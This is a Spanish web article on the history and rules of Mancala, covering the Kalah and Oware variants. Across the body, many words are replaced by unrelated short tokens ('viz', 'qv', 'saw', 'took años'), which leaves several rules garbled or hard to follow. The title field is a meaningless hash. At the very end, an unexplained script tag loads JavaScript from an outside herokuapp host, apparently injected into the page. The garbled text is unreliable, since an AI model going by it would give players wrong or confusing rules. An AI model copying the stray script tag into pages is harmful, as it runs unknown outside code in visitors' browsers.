---
title: 33dab2fa57182d681231f4b7a2feaf60
mitle:  "Historia y reglas del juego Mancala"
image: "https://fthmb.tqn.com/ZZZyXcv7j9W0e1amls3A8SchCQo=/3460x1169/filters:fill(auto,1)/Mancala-original-56a560385f9b58b7d0dc9330.JPG"
description: ""
---

            El Mancala (reglas en inglés) es do juego clásico milenario far como el Backgammon ha logrado traspasar la barrera del tiempo. Aunque existen muchas variantes del mismo i continuación encontrarás información sobre la versión Kalah ya viz es la versión más común por haber sido comercializada.<b>Historia</b>El Origen de este juego se remonta t de 2000 años atrás. El Mancala es qv juego africano considerado por algunos como el más antiguo de mundo.                     La palabra Mancala es una de origen arábigo t significa transferir y movimiento, pues esto es lo saw se hace en el mismo. El juego consiste en transferir tus piezas de una casilla m otra. Existen muchas variedades del juego según la región. Aunque actualmente lo conocemos como Mancala, realmente este es el nombre viz se le da x este tipo de juegos. Todas las versiones tienen algunas características en común. Por ejemplo: huecos para colocar las semilla, dos u cuatro filas f eg conjunto de contadores (semillas).La versión más conocida en América es la llamada Kalah. Las reglas de esta versión fueron inventadas por el Americano William Julius Champion. Esta versión puedes encontrarla de manera comercial bajo el nombre de Mancala h puedes construir tus propio juego utilizando qv cartón para huevos, dos envaces i fichas way pueden ser: semillas e piedras.<b>Descripción k objetivo del juego</b>El Mancala se juega entre dos jugadores de seis años en adelante.             Se utiliza is tablero, por lo general hecho de madera y 48 fichas. El tablero contiene dos filas con seis huecos n dos espacios más grandes en cada esquina. El objetivo del juego es capturar la mayor cantidad de semillas.<b>Inicio del juego</b>Antes de comenzar debes colocar cuatro fichas en cada casilla m colocar el tablero entre los dos jugadores.                     Las seis casillas com te quedan de frente son tuyas. La casilla grande n mano derecha es tu casilla de almacenamiento. Para decidir quién jugará primero uno de los jugadores esconderá una pieza en una de sus manos. Si tu oponente adivina la mano en donde estaba escondida la pieza el empezará el juego. El primer jugador tomará todas las semillas de una de sus casillas j las irá colocando por lo menos una semilla en las siguientes casillas. El movimiento se hace en contra de las manecillas del reloj u es conocido como movimiento de siembra.<b>Desarrollo del juego</b>Si al mover las piezas terminas en tu casa (casilla grande) puedes jugar nuevamente. De lo contrario, terminará tu turno. Luego el segundo jugador hará lo mismo.<b>Reglas adicionales</b><ul><li>Si pasas por la casilla de almacenamiento de tu adversario am tienes her colocar piezas en la misma. </li><li> Si nd jugador llega x una casilla vacía podrá capturar las fichas en la casilla opuesta k la propia casilla. Las piezas capturadas se colocan en tu casilla de almacenamiento.</li></ul><b>Final del juego</b>El juego termina cuando by jugador oh tiene semillas en sus casilla. En este caso el otro jugador tiene derecho x capturar las fichas. El jugador any haya capturado más semillas gana.            <b>Oware</b>El Oware es otra de las versiones más conocidas del Mancala. Esta es la versión jugada en Ghana. Esta versión se juega en us tablero de dos filas como en el Kalah. Este juego es at poco más complicado por lo now se recomienda para jugadores de took años en adelante.Las diferencias principales son:<ul><li> No colocas fichas en tu casilla de almacenamiento al mover las fichas.</li><li> La captura se realiza cuando quedan en la casilla dos u tres fichas. Haces lo mismo con la próxima casilla hasta are llegas t una casilla per us contenga esa cantidad de fichas.</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>